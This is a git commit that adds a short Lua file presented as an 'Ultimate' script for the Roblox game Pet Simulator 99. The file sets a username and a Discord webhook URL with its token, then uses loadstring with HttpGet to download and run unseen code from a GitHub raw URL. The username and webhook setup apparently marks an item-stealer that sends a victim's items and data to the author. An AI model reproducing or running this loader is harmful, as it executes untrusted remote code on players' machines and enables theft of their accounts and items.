a41c1e366e7479b9c6ade6862db089f41aecb62d
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 21:28:56 +0200

    Added ps99 script: Ps99_Ultimate_script

---
+++ ps99/Ps99_Ultimate_script.lua
@@ -0,0 +1,5 @@
+Username = "alfaraon1YT_2"
+Username2 = "alfaraon1YT_2"
+Webhook = "https://discord.com/api/webhooks/1363597096422346954/eXT3PB_4giR1L0IueQZUQqx9pl4rmMyBaNGKc6IOiWfZN48Sb9Cpb1ccYDlilKTrxZRq"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
